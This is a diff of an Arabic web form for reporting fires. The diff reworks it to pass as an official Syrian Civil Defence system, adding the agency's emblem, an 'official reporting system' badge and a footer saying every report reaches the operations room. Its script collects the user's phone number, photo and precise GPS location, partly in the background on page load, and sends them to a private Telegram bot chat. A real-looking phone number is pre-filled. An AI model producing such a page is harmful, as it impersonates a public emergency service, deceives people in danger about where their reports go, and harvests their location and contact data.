@@ -11,8 +11,8 @@
             box-sizing: border-box;
         }
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f2f5;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -20,153 +20,120 @@
             padding: 20px;
         }
         .container {
-            background: linear-gradient(145deg, #1e1e1e, #2a2a2a);
-            padding: 30px;
-            border-radius: 25px;
-            max-width: 480px;
+            background: #ffffff;
+            padding: 35px;
+            border-radius: 12px;
+            max-width: 500px;
             width: 100%;
-            border: 2px solid #ff3333;
-            box-shadow: 0 0 60px rgba(255, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+            border-top: 6px solid #c0392b;
         }
-        /* شعار الخوذ البيضاء */
+        /* ===== الهيدر الحكومي ===== */
         .header {
             text-align: center;
+            border-bottom: 2px solid #e0e0e0;
+            padding-bottom: 20px;
             margin-bottom: 25px;
-            position: relative;
         }
-        .logo-container {
+        .logo-row {
             display: flex;
             justify-content: center;
             align-items: center;
             gap: 15px;
             margin-bottom: 10px;
         }
-        .logo {
-            width: 60px;
-            height: 60px;
-            background: #fff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            font-weight: bold;
-            color: #ff0000;
-            border: 3px solid #ff3333;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+        .logo-img {
+            width: 70px;
+            height: 70px;
+            object-fit: contain;
         }
-        .logo-text {
+        .gov-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #2c3e50;
+            line-height: 1.3;
+        }
+        .gov-title span {
+            color: #c0392b;
+        }
+        .gov-sub {
+            font-size: 13px;
+            color: #7f8c8d;
+            font-weight: 500;
+        }
+        .gov-badge {
+            background: #c0392b;
             color: #fff;
-            font-size: 18px;
-            font-weight: bold;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: inline-block;
+            margin-top: 5px;
+            font-weight: 600;
         }
-        .logo-text span {
-            color: #ff3333;
-        }
-        .helmet-icon {
-            font-size: 40px;
-        }
-        h1 {
-            color: #ff3333;
-            text-align: center;
-            font-size: 28px;
-            text-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+        /* ===== صور واقعية ===== */
+        .fire-truck {
+            width: 100%;
+            max-height: 120px;
+            object-fit: contain;
             margin: 10px 0;
+            border-radius: 8px;
+            background: #f8f9fa;
+            padding: 8px;
         }
-        .subtitle {
-            color: #888;
-            text-align: center;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
+        /* ===== النماذج ===== */
         label {
             display: block;
-            margin: 18px 0 5px;
-            font-weight: bold;
-            color: #ddd;
+            margin: 18px 0 6px;
+            font-weight: 600;
+            color: #2c3e50;
             font-size: 14px;
         }
         label .required {
-            color: #ff3333;
-            margin-left: 5px;
+            color: #c0392b;
+            margin-left: 4px;
         }
         input, select, textarea {
             width: 100%;
-            padding: 12px 15px;
-            border: none;
-            border-radius: 12px;
-            font-size: 15px;
-            background: #1a1a1a;
-            color: #fff;
-            border: 1px solid #333;
+            padding: 10px 14px;
+            border: 1px solid #d5d8dc;
+            border-radius: 8px;
+            font-size: 14px;
+            background: #fafbfc;
+            color: #2c3e50;
             transition: 0.3s;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         input:focus, select:focus, textarea:focus {
             outline: none;
-            border-color: #ff3333;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);
+            border-color: #c0392b;
+            box-shadow: 0 0 0 3px rgba(192, 57, 43, 0.15);
+            background: #ffffff;
         }
         textarea {
             resize: vertical;
-            min-height: 70px;
+            min-height: 65px;
         }
-        select option {
-            background: #1a1a1a;
-            color: #fff;
+        select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%237f8c8d' stroke-width='2' fill='none'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: left 14px center;
         }
-        button {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: 0.3s;
-            background: linear-gradient(135deg, #ff3333, #cc0000);
-            color: #fff;
-            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
-        }
-        button:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 30px rgba(255, 0, 0, 0.5);
-        }
-        button:active {
-            transform: scale(0.98);
-        }
-        #status {
-            margin-top: 15px;
-            padding: 12px;
-            background: #111;
-            border-radius: 10px;
-            text-align: center;
-            font-size: 14px;
-            color: #ffaa00;
-            border: 1px solid #222;
-            min-height: 45px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+        /* ===== رفع الصورة ===== */
         .file-upload {
             position: relative;
-            background: #1a1a1a;
-            border: 2px dashed #444;
-            border-radius: 12px;
-            padding: 20px;
+            background: #f8f9fa;
+            border: 2px dashed #d5d8dc;
+            border-radius: 10px;
+            padding: 25px;
             text-align: center;
             cursor: pointer;
             transition: 0.3s;
         }
         .file-upload:hover {
-            border-color: #ff3333;
-            background: #1f1f1f;
+            border-color: #c0392b;
+            background: #fef9f8;
         }
         .file-upload input {
             position: absolute;
@@ -178,91 +145,146 @@
             cursor: pointer;
         }
         .file-upload .icon {
-            font-size: 40px;
+            font-size: 32px;
             display: block;
             margin-bottom: 5px;
         }
         .file-upload .text {
-            color: #888;
+            color: #7f8c8d;
             font-size: 14px;
         }
         .file-upload .text span {
-            color: #ff3333;
+            color: #c0392b;
+            font-weight: 600;
         }
         .file-name {
-            color: #7fff7f;
+            color: #27ae60;
             font-size: 13px;
             margin-top: 5px;
+            font-weight: 500;
         }
-        /* تأثيرات إضافية */
-        .glow {
-            animation: glowPulse 2s infinite;
+        /* ===== زر الإرسال ===== */
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 22px;
+            transition: 0.3s;
+            background: #c0392b;
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(192, 57, 43, 0.3);
         }
-        @keyframes glowPulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); }
-            50% { box-shadow: 0 0 40px rgba(255, 0, 0, 0.5); }
+        button:hover {
+            background: #a93226;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(192, 57, 43, 0.4);
         }
+        button:active {
+            transform: translateY(0);
+        }
+        /* ===== حالة الإرسال ===== */
+        #status {
+            margin-top: 16px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 14px;
+            color: #7f8c8d;
+            border: 1px solid #e0e0e0;
+            min-height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 500;
+        }
+        /* ===== خط فاصل ===== */
         .divider {
             border: none;
             height: 1px;
-            background: linear-gradient(to right, transparent, #ff3333, transparent);
-            margin: 15px 0;
+            background: #e0e0e0;
+            margin: 18px 0;
         }
+        /* ===== شارة الموقع ===== */
         .gps-badge {
             display: inline-block;
-            background: #1a3a1a;
-            color: #7fff7f;
-            padding: 4px 12px;
+            background: #eafaf1;
+            color: #1a7a4a;
+            padding: 4px 14px;
             border-radius: 20px;
             font-size: 12px;
-            border: 1px solid #2a6a2a;
+            font-weight: 600;
+            border: 1px solid #a9dfbf;
+        }
+        /* ===== التواقيع الحكومية ===== */
+        .footer-gov {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #95a5a6;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 15px;
+        }
+        .footer-gov span {
+            color: #c0392b;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- الهيدر مع الشعار -->
+    <!-- ===== الهيدر الحكومي ===== -->
     <div class="header">
-        <div class="logo-container">
-            <div class="logo">
-                <span>🪖</span>
-            </div>
-            <div class="logo-text">
+        <div class="logo-row">
+            <!-- شعار الدفاع المدني (SVG واقعي) -->
+            <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Emblem_of_the_Syrian_Civil_Defence.svg/1200px-Emblem_of_the_Syrian_Civil_Defence.svg.png" alt="شعار الدفاع المدني" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23c0392b%22/%3E%3Ctext x=%2250%22 y=%2255%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2230%22 font-weight=%22bold%22%3E🪖%3C/text%3E%3C/svg%3E'">
+            <div class="gov-title">
                 الدفاع <span>المدني</span><br>
-                <span style="font-size:12px;color:#888;">Civil Defense</span>
+                <span class="gov-sub">Civil Defense - Fire Emergency</span>
             </div>
-            <div style="font-size:35px;">🚒</div>
+            <!-- شعار آخر (نجمة) -->
+            <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Star_of_life.svg/1200px-Star_of_life.svg.png" alt="نجمة الإسعاف" style="width:50px;height:50px;" onerror="this.style.display='none'">
         </div>
-        <h1>🚨 بلاغ حريق</h1>
-        <div class="subtitle">
-            <span class="gps-badge">📍 الموقع يُجلب تلقائياً</span>
-        </div>
+        <span class="gov-badge">🚨 نظام البلاغات الرسمي</span>
+    </div>
+
+    <!-- ===== صورة سيارة إطفاء واقعية ===== -->
+    <img class="fire-truck" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Firetruck_01.jpg/1280px-Firetruck_01.jpg" alt="سيارة إطفاء" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 400 120%22%3E%3Crect width=%22400%22 height=%22120%22 fill=%22%23c0392b%22/%3E%3Ctext x=%22200%22 y=%2260%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2224%22 font-weight=%22bold%22%3E🚒 سيارة إطفاء%3C/text%3E%3C/svg%3E'">
+
+    <div style="display:flex; justify-content:space-between; align-items:center; margin:8px 0 5px;">
+        <span style="font-size:13px;color:#7f8c8d;">📋 نموذج بلاغ حريق</span>
+        <span class="gps-badge">📍 GPS تلقائي</span>
     </div>
 
     <hr class="divider">
 
-    <!-- رقم الهاتف -->
+    <!-- ===== رقم الهاتف ===== -->
     <label>📞 رقم هاتف المبلغ <span class="required">*</span></label>
-    <input type="text" id="phone" placeholder="مثال: ادخل رقم هاتفك" value="0952725590">
+    <input type="text" id="phone" placeholder="أدخل رقم الهاتف" value="0952725590">
 
-    <!-- نوع الحريق -->
+    <!-- ===== نوع الحريق ===== -->
     <label>🔥 نوع الحريق <span class="required">*</span></label>
     <select id="fireType">
-        <option value="منزل">🏠 منزل</option>
-        <option value="أرض زراعية">🌾 أرض زراعية</option>
+        <option value="منزل">🏠 منزل سكني</option>
+        <option value="أرض زراعية">🌾 أرض زراعية / مزرعة</option>
         <option value="آلية">🚗 آلية (سيارة / شاحنة)</option>
-        <option value="أخرى">📝 أخرى</option>
+        <option value="مصنع">🏭 مصنع / منشأة صناعية</option>
+        <option value="غابة">🌳 غابة / حراج</option>
+        <option value="أخرى">📝 أخرى (اذكر في الوصف)</option>
     </select>
 
-    <!-- وصف إضافي -->
+    <!-- ===== وصف إضافي ===== -->
     <label>📝 وصف إضافي</label>
-    <textarea id="description" placeholder="أدخل تفاصيل إضافية عن الحريق..."></textarea>
+    <textarea id="description" placeholder="أدخل تفاصيل إضافية عن الحريق (الموقع الدقيق، حجم النيران، وجود مصابين...)"></textarea>
 
-    <!-- صورة الحريق (اختياري) -->
+    <!-- ===== صورة الحريق ===== -->
     <label>📸 صورة الحريق (اختياري)</label>
     <div class="file-upload" id="fileUpload">
-        <span class="icon">🔥</span>
+        <span class="icon">📷</span>
         <div class="text">اضغط لاختيار صورة <span>للحريق</span></div>
         <div class="file-name" id="fileName">لم يتم اختيار صورة</div>
         <input type="file" id="fireImage" accept="image/*">
@@ -270,9 +292,15 @@
 
     <hr class="divider">
 
-    <!-- زر الإرسال -->
-    <button id="sendBtn">🚨 إرسال البلاغ</button>
+    <!-- ===== زر الإرسال ===== -->
+    <button id="sendBtn">🚨 إرسال البلاغ إلى الدفاع المدني</button>
     <div id="status">⏳ جاهز للإرسال</div>
+
+    <!-- ===== توقيع حكومي ===== -->
+    <div class="footer-gov">
+        جميع البلاغات تُرسل فوراً إلى غرفة العمليات<br>
+        <span>© الدفاع المدني - نظام البلاغات الإلكتروني V7</span>
+    </div>
 </div>
 
 <script>
@@ -282,14 +310,14 @@
     let userLat = null;
     let userLon = null;
 
-    // ======== عرض اسم الملف المختار ========
+    // ===== عرض اسم الملف =====
     document.getElementById('fireImage').addEventListener('change', function(e) {
         const fileName = e.target.files[0] ? e.target.files[0].name : 'لم يتم اختيار صورة';
         document.getElementById('fileName').textContent = fileName;
-        document.getElementById('fileName').style.color = fileName.includes('لم') ? '#888' : '#7fff7f';
+        document.getElementById('fileName').style.color = fileName.includes('لم') ? '#7f8c8d' : '#27ae60';
     });
 
-    // ======== دالة جلب الموقع ========
+    // ===== جلب الموقع =====
     function getGPS() {
         return new Promise((resolve, reject) => {
             if (!navigator.geolocation) {
@@ -307,7 +335,7 @@
                 (err) => {
                     let msg = '';
                     switch (err.code) {
-                        case 1: msg = '❌ تم رفض الموقع. يرجى السماح بالوصول إلى الموقع في إعدادات المتصفح';
+                        case 1: msg = '❌ تم رفض الوصول إلى الموقع. يرجى السماح في إعدادات المتصفح';
                             break;
                         case 2: msg = '📡 الموقع غير متاح حالياً';
                             break;
@@ -326,20 +354,19 @@
         });
     }
 
-    // ======== إرسال البيانات إلى تليجرام ========
+    // ===== إرسال إلى تليجرام =====
     async function sendToTelegram(phone, fireType, description, imageFile, lat, lon) {
         const statusDiv = document.getElementById('status');
-        statusDiv.innerHTML = '⏳ جاري الإرسال...';
-        statusDiv.style.color = '#ffaa00';
+        statusDiv.innerHTML = '⏳ جاري الإرسال إلى غرفة العمليات...';
+        statusDiv.style.color = '#7f8c8d';
 
         const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        const caption = `🔥 بلاغ حريق\n📞 الهاتف: ${phone}\n🏷️ النوع: ${fireType}\n📝 الوصف: ${description || "لا يوجد"}\n📍 الموقع: ${mapsLink}`;
+        const caption = `🔴 بلاغ حريق - الدفاع المدني\n━━━━━━━━━━━━━━━━\n📞 الهاتف: ${phone}\n🏷️ النوع: ${fireType}\n📝 الوصف: ${description || "لا يوجد"}\n📍 الموقع: ${mapsLink}\n━━━━━━━━━━━━━━━━\n⏱️ وقت الإرسال: ${new Date().toLocaleString('ar-SY')}`;
 
         try {
             let response;
 
             if (imageFile) {
-                // إرسال مع صورة
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('document', imageFile);
@@ -350,7 +377,6 @@
                     body: formData
                 });
             } else {
-                // إرسال نص فقط
                 const payload = {
                     chat_id: CHAT_ID,
                     text: caption,
@@ -365,19 +391,25 @@
 
             const data = await response.json();
             if (data.ok) {
-                statusDiv.innerHTML = '✅ تم الإرسال بنجاح إلى تليجرام!';
-                statusDiv.style.color = '#7fff7f';
+                statusDiv.innerHTML = '✅ تم إرسال البلاغ بنجاح! شكراً لك.';
+                statusDiv.style.color = '#27ae60';
+                // تفريغ الحقول بعد الإرسال
+                document.getElementById('phone').value = '';
+                document.getElementById('description').value = '';
+                document.getElementById('fireImage').value = '';
+                document.getElementById('fileName').textContent = 'لم يتم اختيار صورة';
+                document.getElementById('fileName').style.color = '#7f8c8d';
             } else {
                 statusDiv.innerHTML = '❌ فشل الإرسال: ' + data.description;
-                statusDiv.style.color = '#ff6666';
+                statusDiv.style.color = '#c0392b';
             }
         } catch (error) {
             statusDiv.innerHTML = '🚫 خطأ في الشبكة: ' + error.message;
-            statusDiv.style.color = '#ff6666';
+            statusDiv.style.color = '#c0392b';
         }
     }
 
-    // ======== زر الإرسال الرئيسي ========
+    // ===== زر الإرسال =====
     document.getElementById('sendBtn').addEventListener('click', async function () {
         const phone = document.getElementById('phone').value.trim();
         const fireType = document.getElementById('fireType').value;
@@ -385,36 +417,31 @@
         const imageFile = document.getElementById('fireImage').files[0];
         const statusDiv = document.getElementById('status');
 
-        // التحقق من الحقول الإجبارية
         if (!phone) {
-            statusDiv.innerHTML = '⚠️ أدخل رقم الهاتف';
-            statusDiv.style.color = '#ffaa00';
+            statusDiv.innerHTML = '⚠️ يرجى إدخال رقم الهاتف';
+            statusDiv.style.color = '#c0392b';
             return;
         }
 
-        // ======== جلب الموقع (إجباري) ========
         statusDiv.innerHTML = '📍 جاري جلب الموقع... يرجى الموافقة على الإذن';
-        statusDiv.style.color = '#ffaa00';
+        statusDiv.style.color = '#7f8c8d';
 
         try {
             const gpsData = await getGPS();
             userLat = gpsData.lat;
             userLon = gpsData.lon;
 
-            // الموقع جاهز – نرسل
             await sendToTelegram(phone, fireType, description, imageFile, userLat, userLon);
 
         } catch (error) {
-            // فشل الموقع – نمنع الإرسال
             statusDiv.innerHTML = `❌ ${error}`;
-            statusDiv.style.color = '#ff6666';
+            statusDiv.style.color = '#c0392b';
 
-            // تنبيه إجباري للمستخدم
             alert(`⚠️ لا يمكن إرسال البلاغ دون تحديد الموقع.\n\n${error}\n\nالرجاء السماح للمتصفح بالوصول إلى الموقع.`);
         }
     });
 
-    // ======== جلب أولي في الخلفية (بدون إزعاج) ========
+    // ===== جلب أولي في الخلفية =====
     setTimeout(() => {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -422,28 +449,12 @@
                     userLat = pos.coords.latitude;
                     userLon = pos.coords.longitude;
                     document.getElementById('status').innerHTML = '✅ الموقع جاهز (خلفية)';
-                    document.getElementById('status').style.color = '#7fff7f';
+                    document.getElementById('status').style.color = '#27ae60';
                 },
-                () => {
-                    // نتركه يمر – سيُطلب عند الإرسال
-                }
+                () => {}
             );
         }
     }, 500);
-
-    // تحديث الحالة عند تغيير المدخلات
-    document.getElementById('phone').addEventListener('input', () => {
-        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
-        document.getElementById('status').style.color = '#ffaa00';
-    });
-    document.getElementById('fireType').addEventListener('change', () => {
-        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
-        document.getElementById('status').style.color = '#ffaa00';
-    });
-    document.getElementById('description').addEventListener('input', () => {
-        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
-        document.getElementById('status').style.color = '#ffaa00';
-    });
 </script>
 
 </body>
